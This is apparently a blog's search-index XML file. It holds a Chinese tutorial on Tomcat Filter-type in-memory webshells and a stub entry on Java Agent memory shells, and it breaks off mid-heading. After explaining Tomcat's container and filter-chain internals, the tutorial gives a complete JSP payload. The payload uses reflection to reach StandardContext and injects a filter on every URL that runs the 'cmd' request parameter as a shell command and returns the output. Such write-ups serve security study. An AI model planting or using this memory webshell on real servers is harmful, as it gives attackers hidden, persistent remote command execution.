<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>JAVA-JAVA-Agent内存马</title>
      <link href="/2023/06/28/JAVA-JAVA-Agent%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2023/06/28/JAVA-JAVA-Agent%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-Agent前置知识"><a href="#Java-Agent前置知识" class="headerlink" title="Java-Agent前置知识"></a>Java-Agent前置知识</h1>]]></content>
      
      
      <categories>
          
          <category> JAVA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA-Tomcat-Filter内存马</title>
      <link href="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="什么是servlet？"><a href="#什么是servlet？" class="headerlink" title="什么是servlet？"></a>什么是servlet？</h2><p>servlet 是用作与处理请求和响应的一种程序 ，并且 Servlet是为了实现动态页面而衍生的东西。</p><p><img src="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/1.png" alt="one"></p><h2 id="Tomcat-与-Servlet-的关系"><a href="#Tomcat-与-Servlet-的关系" class="headerlink" title="Tomcat 与 Servlet 的关系"></a>Tomcat 与 Servlet 的关系</h2><p>Tomcat 是 Web 应用服务器，是一个 Servlet&#x2F;JSP 容器，Tomcat 作为 Servlet 的容器，能够将用户的请求发送给 Servlet，并且将 Servlet 的响应返回给用户，Tomcat中有四种类型的Servlet容器，从上到下分别是 Engine、Host、Context、Wrapper</p><ol><li>Engine，实现类为 org.apache.catalina.core.StandardEngine</li><li>Host，实现类为 org.apache.catalina.core.StandardHost</li><li>Context，实现类为 org.apache.catalina.core.StandardContext</li><li>Wrapper，实现类为 org.apache.catalina.core.StandardWrapper</li></ol><p>每个Wrapper实例表示一个具体的Servlet定义，StandardWrapper是Wrapper接口的标准实现类（StandardWrapper 的主要任务就是载入Servlet类并且进行实例化） </p><ul><li><strong>Wrapper 主要负责管理 Servlet ，包括的 Servlet 的装载、初始化、执行以及资源回收</strong></li><li><strong>Context 表示一个 Web 应用程序，而一个 Web 程序可 能有多个 Servlet(即：Wrapper)</strong></li><li><strong>Host 表示一个虚拟主机，或者说一个站点，一个 Tomcat 可以配置 多个站点（Host）一个站点（ Host） 可以部署多个 Web 应用(即：Context)</strong></li><li><strong>Engine 代表 引擎， 用于管理多个站点（Host），一个 Service 只能有 一个 Engine</strong></li></ul><p>他们的关系如图所示：</p><p><img src="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/2.jpg" alt="one"></p><p>更具体点的：</p><p><img src="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/3.png" alt="one"></p><h1 id="内存马介绍"><a href="#内存马介绍" class="headerlink" title="内存马介绍"></a>内存马介绍</h1><p>学过 Servlet 的都会知道 Filter (过滤器) ，我们可以通过自定义过滤器来对用户的一些请求进行拦截修改等操作，下面是一张简单的流程图<br><img src="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/4.png" alt="one"></p><p>从上图看出，我们请求会经过 Filter 后 才会到 Servlet ，如果我们在之前动态创建一个 恶意的Filter 放在前面优先执行，就会进行命令执行，这也就成为了一个内存 Webshell~ 所以我们的目标则是动态创建一个 Filter 放在 首要位置，当然了，Servlet也是可以注入内存马的，但都是后话了。</p><h1 id="Tomcat-Filter-流程分析"><a href="#Tomcat-Filter-流程分析" class="headerlink" title="Tomcat Filter 流程分析"></a>Tomcat Filter 流程分析</h1><p>自定义Filter:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fiter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Filter初始化&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;执行过滤&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;销毁&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们还需要在 web.xml 中 注册我们的Filter 这里我们设置 url-pattern 为 &#x2F;demo ， 即在网页中访问 &#x2F;demo 这会触发此 Filter </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;  </span><br><span class="line">&lt;web-app xmlns=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span>  </span><br><span class="line">         xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>  </span><br><span class="line">         xsi:schemaLocation=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span>  </span><br><span class="line">         version=<span class="string">&quot;4.0&quot;</span>&gt;  </span><br><span class="line">  </span><br><span class="line">  &lt;filter&gt;    &lt;filter-name&gt;Myfilter&lt;/filter-name&gt;  </span><br><span class="line">    &lt;filter-class&gt;Filter.fiter&lt;/filter-class&gt;  </span><br><span class="line">  &lt;/filter&gt;  </span><br><span class="line">  &lt;filter-mapping&gt;    &lt;filter-name&gt;Myfilter&lt;/filter-name&gt;  </span><br><span class="line">    &lt;url-pattern&gt;/demo&lt;/url-pattern&gt;  </span><br><span class="line">  &lt;/filter-mapping&gt;  </span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure><p>随后启动服务器，访问 <code>http://127.0.0.1:8080/demo</code></p><p><img src="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/5.png" alt="one"></p><p>则请求一次 &#x2F;demo  则会触发一次Filter 过滤。</p><p>在具体分析流程之前我们先介绍一下后面会遇到的几个类：</p><ul><li>FilterDefs：存放FilterDef的数组 ，FilterDef 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息</li><li>FilterConfigs：存放filterConfig的数组，在 FilterConfig 中主要存放 FilterDef 和 Filter对象等信息</li><li>FilterMaps：存放FilterMap的数组，在 FilterMap 中主要存放了 FilterName 和 对应的URLPattern</li><li>FilterChain：过滤器链，该对象上的 doFilter 方法能依次调用链上的 Filter</li><li>WebXml：存放 web.xml 中内容的类</li><li>ContextConfig：Web应用的上下文配置类</li><li>StandardContext：Context接口的标准实现类，一个 Context 代表一个 Web 应用，其下可以包含多个 Wrapper</li><li>StandardWrapperValve：一个 Wrapper 的标准实现类，一个 Wrapper 代表一个Servlet</li></ul><p>接下来就来分析一下Tomcat是如何将我们自定义的filter 进行设置并调用的，先来看一张宽字节安全的流程图：</p><p><img src="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/6.png" alt="one"></p><p>我们通过 StandardWrapperValue 这个方法 最后得到了 FilterChain 其中 Tomcat 会首先通过ContextConfig 创建WebXML的实例来解析 web.xml 从而获取 filter ，然后ApplicationFilterFactory 会对 <strong>filter 的名称</strong>和<strong>待拦截URL</strong> 放到 <strong>FilterMap</strong>中 然后进行一次url匹配， 然后 将获取的 FilterChain 返回到 StandardWrapperValue 去，然后在StandardWrapperValue 中 会调用chain.doFilter 方法  从而实现执行对应的过滤器。</p><p>下面调试一下</p><p>首先在  <strong>org.apache.catalina.core.StandardWrapperValue</strong>处下断点<br>从上述流程中可以看到，这个方法是为了获取生成FilterChain<br>那么直接在此处下断点</p><p>这里可以看到  ApplicationFilterFactory 会调用 createFilterChain() ，跟进</p><p><img src="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/7.png" alt="one"></p><p>我们从红框的代码看到  首先会调用.getParent获取当前的上下文，也就是 当前的Web 应用，然后会 filterMaps ，而里面是过滤器名和url映射</p><p><img src="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/8.jpg" alt="one"></p><p><img src="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/9.png" alt="one"></p><p>再往下看， 这里会循环FilterMaps 中的 FilterMap，如果发现符合当前请求Url 与 FilterMap 中的urlPattern 匹配，就会进入 if 判断会调用 fidFilterConfig 方法，在filterconfigs中寻找对应filterName 名称的FilterConfig 如果不为null 就进入if 判断，将 filterConfig 添加到 filterChain 中<br><img src="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/11.png" alt="one"></p><p>跟进addFilter 函数</p><p><img src="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/10.png" alt="one"></p><p>for 循环 是将 filters数组循环了一下  ，判断我们的filter 是否存在</p><p>下面这个 if  判断 其实就是扩容，如果 n 已经等于当前 filters 的长度了 就再添加 10 个容量，最后将我们的 filterconfig 添加到 filters 中</p><p>至此，FilterChain 组装完成，重新回到StandardContextValue 中调用 filterChain 的 doFilter 方法 ，就会依次调用 Filter 链上的 doFilter方法</p><p><img src="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/12.jpg" alt="one"></p><p>在 doFilter 方法中会调用 internalDoFilter方法</p><p><img src="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/13.jpg" alt="one"></p><p>在internalDoFilter方法中首先会依次从 filters 中取出 filterConfig</p><p>然后会调用 getFilter() 将 filter 从 filterConfig 中取出，调用 filter 的 doFilter方法</p><p><img src="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/14.jpg" alt="one"><br>从而调用我们自定义过滤器中的 doFilter 方法，从而触发了相应的代码<br><img src="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/15.jpg" alt="one"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ol><li>根据请求的 URL 从 FilterMaps 中找出 与URL对应的 filter名称</li><li>根据 Filter 名称 去 FilterConfigs 中 寻找对应的名称的 FilterConfig</li><li>找到对应的FilterConfig后添加至FilterChain中，并返回FilterChain</li><li>filterChain 中调用 internalDoFilter 遍历获取 chain 中的 FilterConfig ，然后从 FilterConfig 中获取 Filter，然后调用 Filter 的 doFilter 方法</li></ol><p>根据上面的简单总结，不难发现最开始是从 context 中获取的 FilterMaps，将符合条件的依次按照顺序进行调用，那么我们可以将自己创建的一个 FilterMap 然后将其放在 FilterMaps 的最前面，这样当 urlpattern 匹配的时候就回去找到对应 FilterName 的 FilterConfig ，然后添加到 FilterChain 中，最终触发我们的内存shell~</p><h1 id="Filter型内存马注入"><a href="#Filter型内存马注入" class="headerlink" title="Filter型内存马注入"></a>Filter型内存马注入</h1><p>该方法只能在 tomcat 7.x 以上利用具体原因会在后文提到</p><p>我们现在已知 最终的 FilterChain 是从 context 中获取到的 FilterMaps </p><p><img src="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/16.jpg" alt="one"></p><p>那么我们该如何获取这个 context 呢？</p><p>当我们可以获取 request 的时候，我们这里可以使用如下方法，<br>将我们的 ServletContext 转为 StandardContext 从而获取 context</p><p>ps：当 Web 容器启动的时候会为每个 Web 应用都创建一个 ServletContext 对象，代表当前 Web 应用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext(); </span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>); appctx.setAccessible(<span class="literal">true</span>); </span><br><span class="line"><span class="comment">// ApplicationContext 为 ServletContext 的实现类 </span></span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext); <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>); stdctx.setAccessible(<span class="literal">true</span>); </span><br><span class="line"><span class="comment">// 这样我们就获取到了 context </span></span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure><h1 id="构造payload的过程"><a href="#构造payload的过程" class="headerlink" title="构造payload的过程"></a>构造payload的过程</h1><p>我们用 jsp 进行payload 的调试 首先把 web.xml 中所有的filter注释掉</p><p>在 web 目录下 新建一个 filterDemo.jsp </p><p><img src="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/17.png" alt="one"></p><p>内容为：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;FilterAgent&quot;</span>;</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"> </span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    System.out.println(appctx);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"> </span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"> </span><br><span class="line">    <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) request;</span><br><span class="line">                <span class="type">HttpServletResponse</span> <span class="variable">resp</span> <span class="operator">=</span> (HttpServletResponse) response;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    resp.getWriter().write(output);</span><br><span class="line">                    resp.getWriter().flush();</span><br><span class="line">                &#125;</span><br><span class="line">                chain.doFilter(request, response);</span><br><span class="line">                System.out.println(<span class="string">&quot;成功注入！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"> </span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将filterDef添加到filterDefs中</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"> </span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"> </span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"> </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"> </span><br><span class="line">        filterConfigs.put(name,filterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;Inject Success !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>为什么 是JSP 而不是 .class 文件呢？ 其实是jsp 其实就是servlet 的一种实现，而我们刚才调试的 是将filter 直接写到 web.xml中，也就是直接改配置文件了，而利用jsp的方式 是将我们构造的 恶意 filter 直接 加载到tomcat 的context 中执行，就省去了自己注入到配置文件中的一步。</p><p>首先是 获取 context 的过程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">   <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">   System.out.println(appctx);</span><br><span class="line">   appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">   <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">   <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">   stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">   <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure><p>我们在第一条语句 下断点，并访问 filterDemo.jsp 页面，运行停到断点处</p><p><img src="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/18.png" alt="one"></p><p>然后单步步过<br><img src="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/19.jpg" alt="one"></p><p>在Web应用中获取的ServletContext实际上是ApplicationContextFacade对象，对ApplicationContext进行了封装，而ApplicationContext实例中又包含了StandardContext实例，以此来获取操作Tomcat容器内部的一些信息，例如Servlet的注册等。通过上面的图可以很清晰的看到两者之间的关系。</p><p>当我们能直接获取 request 的时候，可以直接将 ServletContext 转为 StandardContext 从而获取 context。其实也是层层递归取出context字段的值。</p><p>通过Java反射获取servletContext所属的类（ServletContext实际上是ApplicationContextFacade对象），使用getDeclaredField根据指定名称context获取类的属性（private final org.apache.catalina.core.ApplicationContext），因为是private类型，所以使用setAccessible取消对权限的检查，实现对私有的访问，此时appctx的值：</p><p><img src="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/20.png" alt="one"></p><p>然后<br><code>ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</code></p><p>是获取(ApplicationContext)context的内容，那么现在我们已经得到了(ApplicationContext)context，我们需要获取到(StandardContext)context的值。</p><p>看变量值我们可以发现stdctx中的值为<br><code>private final org.apache.catalina.core.StandardContext org.apache.catalina.core.ApplicationContext.context</code></p><p>其中存在StandardContext，那么说明ApplicationContext实例中包含了StandardContext实例，这几行代码原理同上</p><p>然后我们就得到了我们需要的context</p><p><img src="/2023/06/27/JAVA-Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/21.png" alt="one"></p><p>至此获得了 context </p><h2 id="修改-filterConfigs-filterDefs-filterMaps"><a href="#修改-filterConfigs-filterDefs-filterMaps" class="headerlink" title="修改 filterConfigs  filterDefs  filterMaps"></a>修改 filterConfigs  filterDefs  filterMaps</h2><p><strong>FilterDefs</strong>：存放FilterDef的数组 ，<strong>FilterDef</strong> 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息</p><p><strong>filterConfigs</strong>：存放filterConfig的数组，在 <strong>FilterConfig</strong> 中主要存放 FilterDef 和 Filter对象等信息</p><p><strong>filterMaps</strong>：一个存放FilterMap的数组，在 <strong>FilterMap</strong> 中主要存放了 FilterName 和 对应的URLPattern</p><p>大致流程如下：</p><ol><li>创建一个恶意 Filter</li><li>利用 FilterDef 对 Filter 进行一个封装</li><li>将 FilterDef 添加到 FilterDefs 和 FilterConfig</li><li>创建 FilterMap ，将我们的 Filter 和 urlpattern 相对应，存放到 filterMaps中（由于 Filter 生效会有一个先后顺序，所以我们一般都是放在最前面，让我们的 Filter 最先触发）</li></ol><p>先来看看我们将会用到的三个方法：</p><h2 id="addFilterDef：添加一个filterDef到Context-addFilterMapBefore：添加filterMap到所有filter最前面-addFilterMap-添加-FilterMap"><a href="#addFilterDef：添加一个filterDef到Context-addFilterMapBefore：添加filterMap到所有filter最前面-addFilterMap-添加-FilterMap" class="headerlink" title="- addFilterDef：添加一个filterDef到Context- 